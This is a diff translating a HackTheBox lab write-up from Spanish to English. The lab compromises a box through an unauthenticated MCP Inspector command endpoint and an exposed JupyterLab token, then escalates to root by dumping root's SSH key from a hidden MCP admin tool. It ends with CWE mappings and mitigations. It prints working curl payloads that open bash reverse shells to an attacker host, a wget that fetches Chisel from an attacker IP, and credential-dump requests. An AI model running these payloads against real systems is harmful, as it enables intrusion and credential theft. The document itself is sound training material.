@@ -1,59 +1,56 @@
-# DevHub — HackTheBox Writeup
+# DevHub - HackTheBox Writeup
 
-> **SO:** Linux (Ubuntu)  
-> **Stack:** nginx, MCPJam Inspector, JupyterLab, Python MCP server  
-> **Técnicas:** RCE ciego en endpoint MCP, Chisel pivoting, credenciales hardcodeadas, SSH key dump  
+**OS:** Linux (Ubuntu)  
+**Stack:** nginx, MCPJam Inspector, JupyterLab, Python MCP server  
+**Techniques:** Blind RCE in an MCP endpoint, Chisel pivoting, hardcoded credentials, root SSH key dump
 
 ---
 
-## Cadena de ataque
+## Attack Chain Overview
 
-```
-MCPJam Inspector (puerto 6274)
-        ↓
-RCE ciego en /api/mcp/connect → reverse shell como mcp-dev
-        ↓
-Procesos internos → JupyterLab (8888) + opsmcp (5000)
-        ↓
-Chisel pivoting → acceso a servicios internos
-        ↓
-Token JupyterLab en procesos → shell como analyst
-        ↓
-/opt/opsmcp/server.py → API key hardcodeada
-        ↓
-ops._admin_dump → clave SSH privada de root
-        ↓
-SSH como root
+```text
+MCPJam Inspector on port 6274
+  -> blind RCE in /api/mcp/connect
+  -> reverse shell as mcp-dev
+  -> internal processes reveal JupyterLab on 8888 and opsmcp on 5000
+  -> Chisel pivot to loopback-only services
+  -> JupyterLab token exposed in process arguments
+  -> shell as analyst
+  -> /opt/opsmcp/server.py contains a hardcoded API key
+  -> ops._admin_dump returns root private SSH key
+  -> SSH as root
 ```
 
 ---
 
-## Reconocimiento
+## Reconnaissance
 
-### Escaneo de puertos
+### Port Scan
 
 ```bash
 nmap -sS --min-rate 5000 -p- -Pn -n --open $TARGET -oN silent
 nmap -sVC -p 22,80,6274 $TARGET -oN service
 ```
 
-**Puertos abiertos:**
+**Open ports:**
 
-| Puerto | Servicio | Detalle |
-|--------|----------|---------|
+| Port | Service | Detail |
+|------|---------|--------|
 | 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu |
-| 80/tcp | HTTP | nginx 1.18.0 — "DevHub - Internal Development Platform" |
-| 6274/tcp | MCPJam Inspector | Servidor MCP para interacción con LLMs |
+| 80/tcp | HTTP | nginx 1.18.0 - "DevHub - Internal Development Platform" |
+| 6274/tcp | MCPJam Inspector | MCP server for LLM/tool interaction |
 
-El puerto 6274 ejecuta un **MCPJam Inspector** — un servidor que expone herramientas ejecutables diseñadas para que modelos de lenguaje interactúen con el sistema. Sin autenticación ni restricciones de ejecución.
+Port `6274` exposed **MCPJam Inspector**, a server that can launch executable tools for model-driven workflows. It was reachable without authentication or execution restrictions.
 
 ---
 
-## Acceso inicial — RCE en MCPJam Inspector
+## Initial Access - MCPJam Inspector RCE
 
-### Identificación de la vulnerabilidad
+Full technique: [mcp-api-injection.md](../../../exploits/web-rce/mcp-api-injection.md).
 
-El endpoint `POST /api/mcp/connect` acepta un campo `command` en el cuerpo JSON que se ejecuta directamente en el sistema sin validación ni autenticación:
+### Vulnerability Identification
+
+The `POST /api/mcp/connect` endpoint accepts a JSON `command` field and executes it directly on the system without validation or authentication:
 
 ```bash
 curl -X POST http://$TARGET:6274/api/mcp/connect \
@@ -61,30 +58,31 @@ curl -X POST http://$TARGET:6274/api/mcp/connect \
   -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'
 ```
 
-**Respuesta:**
+**Response:**
+
 ```json
 {"success":false,"error":"Connection failed... MCP error -32000: Connection closed"}
 ```
 
-El error confirma **RCE ciego** — el comando se ejecuta pero el proceso termina antes de devolver output.
+The error indicates **blind RCE**: the command runs, but the process closes before output is returned.
 
-### Reverse shell como mcp-dev
+### Reverse Shell as `mcp-dev`
 
 ```bash
-# Listener en Kali
+# Listener on Kali
 nc -lvnp 4444
 
-# Payload de reverse shell
+# Reverse shell payload
 curl -X POST http://$TARGET:6274/api/mcp/connect \
   -H "Content-Type: application/json" \
   -d '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/LHOST/4444 0>&1"],"env":{}},"serverId":"revshell"}'
 ```
 
-Shell obtenida como `mcp-dev` (uid=1001).
+The shell landed as `mcp-dev` (uid=1001).
 
 ---
 
-## Enumeración interna
+## Internal Enumeration
 
 ```bash
 id
@@ -96,73 +94,75 @@ ps aux
 # root     1038  ... python3 /opt/opsmcp/server.py
 
 ss -tulnp
-# 127.0.0.1:5000  → opsmcp (corre como root)
-# 127.0.0.1:8888  → JupyterLab (corre como analyst)
+# 127.0.0.1:5000  -> opsmcp (running as root)
+# 127.0.0.1:8888  -> JupyterLab (running as analyst)
 ```
 
-Dos servicios internos no expuestos: **JupyterLab** como `analyst` y **opsmcp** como `root`.
+Two useful services were bound to loopback only: **JupyterLab** as `analyst` and **opsmcp** as `root`.
 
 ---
 
-## Pivoting con Chisel
+## Pivoting With Chisel
 
-Para acceder a los servicios internos desde Kali:
+Full tool note: [chisel.md](../../../tools/pivot/chisel.md).
+
+Expose the internal loopback services back to Kali:
 
 ```bash
-# En Kali — servidor Chisel
+# Kali - Chisel server
 ./chisel server -p 9001 --reverse --socks5
 
-# En la víctima — transferir y ejecutar
+# Victim - transfer and execute
 cd /tmp
 wget http://10.10.14.92:8000/chiselE
 chmod +x chisel
 
-# Opción A — proxy SOCKS5
+# Option A - SOCKS5 proxy
 ./chisel client 10.10.14.92:9001 R:socks &
 
-# Opción B — port forward directo a JupyterLab
+# Option B - direct remote port forward to JupyterLab
 ./chisel client 10.10.14.92:9001 R:8889:127.0.0.1:8888 &
 ```
 
-Con la opción B, JupyterLab queda accesible en `http://localhost:8889` desde Kali directamente.
+With option B, JupyterLab became reachable from Kali at `http://localhost:8889`.
 
 ---
 
-## Acceso a JupyterLab → Shell como analyst
+## JupyterLab Access -> Shell as `analyst`
 
-El token de JupyterLab estaba expuesto en los argumentos del proceso, visible con `ps aux` sin privilegios:
+The JupyterLab token was exposed in process arguments and readable with unprivileged `ps aux`:
 
-```
+```text
 --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
 ```
 
-Accedemos a `http://localhost:8889/token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`, abrimos la terminal integrada de JupyterLab y ejecutamos:
+Browse to `http://localhost:8889/token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`, open the integrated JupyterLab terminal and run:
 
 ```bash
-# Listener en Kali
+# Listener on Kali
 nc -lvnp 5555
 
-# En terminal JupyterLab
+# JupyterLab terminal
 bash -i >& /dev/tcp/LHOST/5555 0>&1
 ```
 
-Shell obtenida como `analyst`.
+The shell landed as `analyst`.
 
 ---
 
-## Análisis del servicio opsmcp
+## `opsmcp` Service Analysis
 
 ```bash
 cat /opt/opsmcp/server.py
 ```
 
-**Hallazgos críticos:**
+**Critical findings:**
 
 ```python
-# API key hardcodeada
+# Hardcoded API key
 VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
 
-# Herramienta oculta sin control de acceso
+# Hidden tool without real access control
 HIDDEN_TOOLS = {
     "ops._admin_dump": {
         "description": "Emergency credential dump - INTERNAL ONLY",
@@ -171,20 +171,23 @@ HIDDEN_TOOLS = {
 }
 ```
 
-La función `_admin_dump` puede dumpear `ssh_keys`, `passwords` y `tokens` usando únicamente la API key como autenticación.
+The `_admin_dump` function can dump `ssh_keys`, `passwords` and `tokens` using only the static API key for authentication.
 
-**Credenciales adicionales hardcodeadas:**
+**Additional hardcoded credentials:**
 
-| Usuario | Contraseña |
-|---------|------------|
+| User | Password |
+|------|----------|
 | analyst | `JupyterN0tebook!2026` |
 | mcp-dev | `Mcp!Insp3ct0r2026` |
-| root    | `$6$rounds=656000$saltsalt$hashedpassword`
+| root | `$6$rounds=656000$saltsalt$hashedpassword` |
+
 ---
 
-## Escalada de privilegios — Dump de clave SSH de root
+## Privilege Escalation - Root SSH Key Dump
 
-### Paso 1 — Activar modo debug
+Full technique: [mcp-admin-dump-credential-leak.md](../../../exploits/web-disclosure/mcp-admin-dump-credential-leak.md).
+
+### Step 1 - Enable Debug Mode
 
 ```bash
 curl -X POST http://localhost:5000/tools/call \
@@ -193,7 +196,7 @@ curl -X POST http://localhost:5000/tools/call \
   -d '{"name":"ops._debug_mode","arguments":{}}'
 ```
 
-### Paso 2 — Dump de clave SSH privada de root
+### Step 2 - Dump Root's Private SSH Key
 
 ```bash
 curl -X POST http://localhost:5000/tools/call \
@@ -202,12 +205,12 @@ curl -X POST http://localhost:5000/tools/call \
   -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
 ```
 
-La respuesta devuelve la **clave privada SSH de root** completa.
+The response returns the complete root private SSH key.
 
-### Paso 3 — SSH como root
+### Step 3 - SSH as `root`
 
 ```bash
-vim id_rsa        # pegar la clave privada obtenida
+vim id_rsa        # paste the recovered private key
 chmod 600 id_rsa
 ssh -i id_rsa root@$TARGET
 cat /root/root.txt
@@ -215,46 +218,46 @@ cat /root/root.txt
 
 ---
 
-## Resumen
+## Summary
 
-| Fase | Técnica | Detalle |
-|------|---------|---------|
-| Foothold | RCE ciego en MCPJam Inspector | `command` sin autenticación en `/api/mcp/connect` |
-| Pivoting | Chisel port forward | Acceso a JupyterLab (8888) y opsmcp (5000) |
-| Lateral | Token JupyterLab expuesto en `ps aux` | Shell como `analyst` |
-| Privesc | Credenciales hardcodeadas en `server.py` | API key → `ops._admin_dump` → clave SSH de root |
-| Root | SSH con clave privada dumpeada | Acceso directo como root |
+| Phase | Technique | Detail |
+|-------|-----------|--------|
+| Foothold | Blind RCE in MCPJam Inspector | Unauthenticated `command` execution in `/api/mcp/connect` |
+| Pivoting | Chisel port forward | Access to JupyterLab on 8888 and opsmcp on 5000 |
+| Lateral | JupyterLab token exposed in `ps aux` | Shell as `analyst` |
+| Privesc | Hardcoded credentials in `server.py` | API key -> `ops._admin_dump` -> root SSH key |
+| Root | SSH with dumped private key | Direct root login |
 
 ---
 
-## Vulnerabilidades explotadas
+## Exploited Vulnerabilities
 
-| CWE | Descripción |
+| CWE | Description |
 |-----|-------------|
-| CWE-306 | Missing Authentication — `/api/mcp/connect` sin autenticación |
-| CWE-78 | OS Command Injection — comandos sin sanitización |
-| CWE-798 | Hard-coded Credentials — API key y passwords en código fuente |
-| CWE-862 | Missing Authorization — `_admin_dump` sin control de acceso |
-| CWE-214 | Sensitive Info en proceso — token expuesto en argumentos de `ps aux` |
+| CWE-306 | Missing Authentication - `/api/mcp/connect` had no authentication |
+| CWE-78 | OS Command Injection - command execution without sanitization |
+| CWE-798 | Hard-coded Credentials - API key and passwords in source code |
+| CWE-862 | Missing Authorization - `_admin_dump` had no per-tool access control |
+| CWE-214 | Sensitive Information in process arguments - Jupyter token exposed through `ps aux` |
 
 ---
 
-## Mitigaciones
+## Mitigations
 
-- Implementar autenticación en todos los endpoints expuestos
-- Validar y sanitizar todo input — usar allowlists de comandos
-- No hardcodear credenciales — usar variables de entorno o gestores de secretos
-- Implementar RBAC y principio de mínimo privilegio
-- No exponer tokens en argumentos de proceso — usar archivos de configuración con permisos restringidos
-- No exponer funcionalidades de debug/dump en producción
+- Require authentication on every exposed endpoint.
+- Validate and sanitize all input; use command allowlists if command execution is unavoidable.
+- Do not hardcode credentials; use environment variables or a secrets manager.
+- Enforce RBAC and least privilege per tool/action.
+- Do not expose tokens in process arguments; use restricted config files or secret stores.
+- Remove debug and dump functionality from production services.
 
 ---
 
-## Referencias
+## References
 
-- [Chisel — Fast TCP/UDP tunnel](https://github.com/jpillora/chisel)
+- [Chisel - Fast TCP/UDP tunnel](https://github.com/jpillora/chisel)
 - [MCPJam Inspector](https://github.com/MCPJam/inspector)
-- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
+- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
 
 ## Related Notes
 
@@ -263,4 +266,5 @@ cat /root/root.txt
 - [netcat](../../../tools/pivot/netcat.md)
 - [chisel](../../../tools/pivot/chisel.md)
 - [mcp-api-injection](../../../exploits/web-rce/mcp-api-injection.md)
+- [mcp-admin-dump-credential-leak](../../../exploits/web-disclosure/mcp-admin-dump-credential-leak.md)
 - [bash-tcp](../../../payloads/reverse-shells/bash-tcp.md)
